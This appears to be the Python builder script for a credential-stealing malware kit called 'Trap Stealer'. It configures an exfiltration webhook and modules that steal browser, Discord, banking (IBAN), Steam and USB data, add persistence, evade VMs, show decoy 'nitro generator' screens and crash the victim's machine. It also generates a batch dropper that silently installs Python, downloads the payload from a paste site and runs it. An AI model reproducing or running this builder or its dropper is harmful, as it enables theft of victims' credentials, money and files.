import os, platform, subprocess, random, shutil
try:
    import requests
except:
    subprocess.run(f'python -m pip install requests', shell=True, check=True)

import requests

import http.cookiejar
import urllib.parse
import urllib.request
from http.cookies import SimpleCookie
from json import loads as json_loads
import sys
import subprocess
import base64
_headers = {"Referer": 'https://rentry.co'} 
class UrllibClient:
    def __init__(self):
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookie_jar))
        urllib.request.install_opener(self.opener)

    def get(self, url, headers={}):
        return self._request(urllib.request.Request(url, headers=headers))

    def post(self, url, data=None, headers={}):
        postdata = urllib.parse.urlencode(data).encode()
        return self._request(urllib.request.Request(url, postdata, headers))

    def _request(self, request):
        response = self.opener.open(request)
        response.status_code = response.getcode()
        response.data = response.read().decode('utf-8')
        return response

def new(url, edit_code, text):
    client, cookie = UrllibClient(), SimpleCookie()
    cookie.load(vars(client.get('https://rentry.co'))['headers']['Set-Cookie'])
    csrftoken = cookie['csrftoken'].value
    payload = {'csrfmiddlewaretoken': csrftoken, 'url': url, 'edit_code': edit_code, 'text': text}
    return json_loads(client.post('https://rentry.co/api/new', payload, headers=_headers).data)

def get_rentry_link(text):
    url, edit_code = '', ''
    response = new(url, edit_code, text)
    if response['status'] != '200':
        print('error: {}'.format(response['content']))
        [print(i) for i in response.get('errors', '').split('.') if i]
        sys.exit(1)
    else:
        pastebin_link = response['url']
        return pastebin_link


def update_batch_script(file_path, new_encoded_url):
        
    code = f'''
@echo off
setlocal EnableDelayedExpansion

set "mouseConnected=false"

for /f "tokens=2 delims==" %%I in ('wmic path Win32_PointingDevice get PNPDeviceID /value ^| find "PNPDeviceID"') do (
    set "mouseConnected=true"
)

if not !mouseConnected! == true (
    exit /b 1
)

set "eee=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
set "eeee=python-installer.exe"

curl -L -o !eeee! !eee! --insecure --silent
start /wait !eeee! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0 > NUL 2>&1
del !eeee!

set "ENCODED_URL={new_encoded_url}/raw

set "OUTPUT_FILE=webpage.py"
curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure

if %ERRORLEVEL% neq 0 (
    echo Error: Failed to download the webpage.
    exit /b 1
)

python -m %OUTPUT_FILE%

del %OUTPUT_FILE%

'''
    with open(file_path, 'w') as file:
        file.writelines(code)

        
while True:
    os.makedirs('./Build', exist_ok=True)
    shutil.copy('main.py', './Build/Trap-Stl-Building.py')

    def clear_console():
        operating_system = platform.system()
        if base64.b64decode("VHJhcCBTdGVhbGVy").decode('utf-8').lower() not in open(__file__, 'r').read().lower(): 
            print('Error checking OS Version !')                                                                                                                                                                                                                                        ; input('Hi dear, you may be using a dualhooked version of the stealer ' + base64.b64decode("VHJhcCBTdGVhbGVy").decode('utf8') + ' on Github. Uninstall this and download the real version!')
            quit()
        if operating_system == 'Windows':
            os.system('cls')

            
    def get_boolean_input(prompt):
        while True:
            user_input = input(prompt).lower()
            if user_input in ['y', 'yes']:
                return True
            elif user_input in ['n', 'no']:
                return False
            else:
                print('Invalid input. Please enter Y or N.')

    with open('main.py', 'r', encoding='utf-8', errors='ignore') as file:
        content = file.read()
    clear_console()
    while True:
        try:
            Webhook = input('Enter the webhook -> ')

            re = requests.get(Webhook)
            if re.status_code == 200 and ('discord.com' in Webhook or 'discordapp.com' in Webhook):
                print('Valid Webhook')
                break
            else:
                print('Invalid Webhook')
        except:
            print('Invalid Webhook')

    Debug = get_boolean_input('Enable Debugging (Useful to share error (Will print and save error in a txt file)) Y/N: ')
    FakeWeb = get_boolean_input('Enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
    FakeGen = get_boolean_input('Enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
    FakeCCGen = get_boolean_input('Enable Fake Credit Cards generator Y/N: ')
    FakeError = get_boolean_input('Enable Fake Error Y/N: ')
    Injection = get_boolean_input('Inject the script to discord Startup Y/N: ')
    Logs = get_boolean_input('Enable logs ? (Will make 1 big zips file like Redline Stealer) ')
    Startup = get_boolean_input('Add the file to the startup folder? Y/N: ')
    Schedule = get_boolean_input('Add an schedule task ? (execute it every day!) Y/N: ')
    No_Debug = get_boolean_input('Enable VM Checker and Anti Debugging Y/N: ')
    Close = get_boolean_input('Prevent Discord from being launched again? Y/N: ')
    OneTime = get_boolean_input('Add the anti-spammer (so he can launch only every 30 minutes)? Y/N: ')
    melter = get_boolean_input('Do you enable melter (Delete the file after using it DONT WORK WITH CRASHER) ? Y/N: ')
    crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything? Y/N: ')
    hide = get_boolean_input('Do you want the program to make the console invisible? Y/N: ')
    change = get_boolean_input('Change the user (discord account) about me with custom text? Y/N: ')
    Drive = get_boolean_input('Steal all connected USB files (may make the stealer slower) Y/N: ')
    Kill_process = get_boolean_input('kill process (chrome, brave, firefox, to steal at 100%) Y/N: ')
    ArchiStealer = get_boolean_input('Want to steal all config files (retrieve all steam password and username found in ArchiSteamFarm) Y/N: ')
    Trap_Extension = get_boolean_input('Enable Trap Extension (Extension for Trap such as IBAN Stealer, and more !) Y/N: ')
    
    if Trap_Extension == True:
        Iban_Stealer = get_boolean_input('Enable Iban Stealer (Trap Extension (Only Py File))  Y/N: ')
    else:
        Iban_Stealer = None

    if change:
        bio = input(r'''Input the text you want the user to have in his about me (Right-click to paste) or put \n to skip a line -> ''')

    if melter:
        crasher = False
        
    while True:
        service = input('Which upload services you want to use? (Choose between gofileio, fileio, catboxmoe) (you can choose with 1,2,3 too): ')
        
        if service.lower() in ['gofile', 'catboxmoe', 'fileio','1','2','3']:
            if service.lower() == 'gofile' or service.lower() == '1':
                gofile = True
                fileio = False
                catbox = False
                break
            elif service.lower() == 'fileio' or service.lower() == '2':
                fileio = True
                gofile = False
                catbox = False
                break
            elif service.lower() == 'catboxmoe' or service.lower() == '3':
                catbox = True
                fileio = False
                gofile = False
                break
            else:
                print('WRONG INPUT! ')
            
    def generate_key(length):
        key = list(range(256))
        random.shuffle(key)
        return bytes(key[:length])

    def obf(text, key):
        encrypted = []
        for char in text:
            encrypted_char = key[char]
            encrypted.append(encrypted_char)
        return bytes(encrypted)

    key_length = 512
    custom_key = generate_key(key_length)

    Webhook = obf(Webhook.encode(), custom_key)
    new_content = content.replace("'%WEBHOOK%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
    new_content = new_content.replace("'%Debug%'", str(Debug))
    if Iban_Stealer == True:
        new_content = new_content.replace("'%IbanStealer%'", str(Iban_Stealer))
    new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
    new_content = new_content.replace("'%Schedule%'", str(Schedule))
    new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
    new_content = new_content.replace("'%Logs%'", str(Logs))
    new_content = new_content.replace("'%FakeCCgen%'", str(FakeCCGen))
    new_content = new_content.replace("'%FakeError%'", str(FakeError))
    new_content = new_content.replace("'%Injection%'", str(Injection))
    new_content = new_content.replace("'%Startup%'", str(Startup))
    new_content = new_content.replace("'%No_Debug%'", str(No_Debug))
    new_content = new_content.replace("'%Close%'", str(Close))
    new_content = new_content.replace("'%Onetime%'", str(OneTime))
    new_content = new_content.replace("'%Melter%'", str(melter))
    new_content = new_content.replace("'%Crash%'", str(crasher))
    new_content = new_content.replace("'%Hide%'", str(hide))
    new_content = new_content.replace("'%ChangeBio%'", str(change))
    new_content = new_content.replace("'%GoFileYesOrNo%'", str(gofile))
    new_content = new_content.replace("'%FileIOYesOrNo%'", str(fileio))
    new_content = new_content.replace("'%CatBoxMoeYesOrNo%'", str(catbox))
    new_content = new_content.replace("'%Drive%'", str(Drive))
    new_content = new_content.replace("'%CloseProc%'", str(Kill_process))
    new_content = new_content.replace("'%ArchiStealer%'", str(ArchiStealer))
    new_content = new_content.replace("'%TrapExtension%'", str(Trap_Extension))

    
    if change:
        new_content = new_content.replace("'%Text%'", str(f"'''{bio}'''"))

    with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
        file.write(new_content)
    clear_console()
    print('Created [+]')

    Obfuscation = input('obfuscate it? Y/N: ')
    Obfuscation = Obfuscation.lower()
    Exe = input('make Trap Stealer with the exe format? (Take some time) Y/N: ')
    Exe = Exe.lower()
    name = input('Enter how you want the file to be named (Do not put the extension): ')
    output_py = f'./Build/{name}.py'
    if os.path.exists(output_py):
        os.remove(output_py)
    while True:
        if Obfuscation in ['y', 'yes']:
            try:
                with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                    file.write(new_content)
                subprocess.run(['python', 'obfuscator.py', f'{name}'], check=False)
                break
            except subprocess.CalledProcessError:
                print('Obfuscation process encountered an error.')
                break
        elif Obfuscation in ['n', 'no']:
            with open('main.py', 'rb') as file:
                try:
                    content = file.read().decode('utf-8')
                except UnicodeDecodeError:
                    print("Error: Unable to decode 'main.py' file. Please ensure it's UTF-8 encoded.")
                    quit()
                print(f'[+] File Created {name}.py')
                with open(f'./Build/{name}.py', 'w', encoding='utf-8') as file:
                    file.write(new_content)
                
                if Exe in ['y', 'yes']:
                    pass
                else:
                    input('Press any key to quit...')
                    quit()
                break
        else:
            Obfuscation = input('Invalid input. Please enter Y or N: ')
            Obfuscation = Obfuscation.lower()

    while True:
        if Exe in ['y', 'yes']:
            
            ask = input('make it exe with pyinstaller or with IExpress? (pyinstaller if pyinstaller) (IExpress if IExpress) (Shortcut if Shortcut)')
            if ask.lower() in ["pyinstaller"]:
                from sys import executable
                icon_path = input('Enter the path to the icon file (leave blank for no icon): ')

                if icon_path.strip():
                    icon_option = f'--icon={icon_path}'
                else:
                    icon_option = ''

                try:
                    __import__('pyinstaller')
                except ImportError:
                    subprocess.run([executable, '-m', 'pip', 'install', 'pyinstaller', '--quiet'], check=True)

                if icon_option == '':
                    command = [
                        'pyinstaller',
                        '--onefile',
                        '--distpath',
                        './Build',
                        f'./Build/{name}.py'
                    ]
                else:
                    command = [
                        'pyinstaller',
                        '--onefile',
                        '--distpath',
                        './Build',
                        f'{icon_option}',
                        f'./Build/{name}.py'
                    ]

                try:
                    subprocess.run(command, shell=True, check=True)
                    input(f'File {name}.exe successfully created. Press any key to quit.')
                    quit()
                except subprocess.CalledProcessError:
                    print("Error while running PyInstaller.")
                    quit()
            elif ask.lower() in ["iexpress"]:
                aaa = f"./Build/temp.py"
                with open(aaa, 'rb') as f:
                    try:
                        link_list = [line.decode('utf-8') for line in f.readlines()]
                        code_string = ''.join(link_list)
                    except UnicodeDecodeError:
                        print(f"Error: Unable to decode '{aaa}' file. Please ensure it's UTF-8 encoded.")
                        quit()

                code_string = ''.join(link_list)

                pastebin_link = get_rentry_link(code_string)
                batch_file_path = "./trap detection/payload.bat"
                
                arguments = [batch_file_path, f'{name}.exe']

                update_batch_script(batch_file_path,pastebin_link)
                
                subprocess.run([f"./trap detection/final.bat"] + arguments, shell=True)
                input('Generated exe payload ! in main folder! press any key to quit')
                quit()
            elif ask.lower() in ["shortcut"]:
                aaa = f"./Build/temp.py"
                with open(aaa, 'rb') as f:
                    try:
                        link_list = [line.decode('utf-8') for line in f.readlines()]
                        code_string = ''.join(link_list)
                    except UnicodeDecodeError:
                        print(f"Error: Unable to decode '{aaa}' file. Please ensure it's UTF-8 encoded.")
                        quit()
                icon_path = input('Enter the path to the icon file (leave blank for no icon): ')
                code_string = ''.join(link_list)

                pastebin_link = get_rentry_link(code_string)
                batch_file_path = "./trap detection/payload.bat"
                
                arguments = [batch_file_path, f'{name}.exe']

                update_batch_script(batch_file_path,pastebin_link)
                
                subprocess.run([f"./trap detection/final.bat"] + arguments, shell=True)
                url = "https://transfer.sh/"

                with open(f"{name}.exe", "rb") as file:
                    files = {"file": file}
                    response = requests.post(url, files=files)

                if response.status_code == 200:
                    url = response.text.strip()
                    script_path = os.path.join(os.path.dirname(__file__), "trap detection", "shortcut.py")
                    subprocess.run(["python", script_path, url, name])
                    
                else:
                    print("Error uploading file. Status code:", response.status_code)

                quit()
            else:
                input('Press any key to quit.')
                quit()
